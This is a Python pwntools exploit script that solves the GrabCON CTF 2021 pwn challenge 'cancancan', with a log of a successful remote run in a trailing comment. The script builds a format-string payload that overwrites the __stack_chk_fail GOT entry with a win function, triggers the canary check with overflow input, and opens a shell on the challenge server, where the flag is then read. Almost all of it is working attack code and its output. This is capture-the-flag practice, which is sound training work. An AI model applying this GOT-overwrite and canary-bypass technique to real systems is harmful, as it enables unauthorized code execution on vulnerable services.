from pwn import *

context(os='linux', arch='i386')
#context.log_level = 'debug'

BINARY = './cancancan'
elf  = ELF(BINARY)

if len(sys.argv) > 1 and sys.argv[1] == 'r':
  HOST = "35.246.42.94"
  PORT = 31337
  s = remote(HOST, PORT)
else:
  s = process(BINARY)

index = 6

s.recvuntil("can you bypass me???\n")

writes = {elf.got.__stack_chk_fail: elf.sym.win}
buf = fmtstr_payload(index, writes, write_size='byte')
s.sendline(buf)

s.sendline("A"*120)

s.interactive()

'''
mito@ubuntu:~/CTF/GrabCON_CTF_2021/Pwn_Can_you$ python solve.py r
[*] '/home/mito/CTF/GrabCON_CTF_2021/Pwn_Can_you/cancancan'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
[+] Opening connection to 35.246.42.94 on port 31337: Done
[*] Switching to interactive mode
$ id
/bin/sh: 1: id: not found
$ ls -l
total 40
drwxr-x--- 1 0 1000  4096 Sep  2 17:05 bin
-rwxr-x--- 1 0 1000 15880 Sep  2 17:07 cancancan
drwxr-x--- 1 0 1000  4096 Sep  2 17:05 dev
-rwxr----- 1 0 1000    31 Sep  2 17:07 flag.txt
drwxr-x--- 1 0 1000  4096 Sep  2 17:05 lib
drwxr-x--- 1 0 1000  4096 Sep  2 17:05 lib32
drwxr-x--- 1 0 1000  4096 Sep  2 17:05 lib64
$ cat flag.txt
GrabCON{Byp4ss_can4ry_1s_fun!}
'''
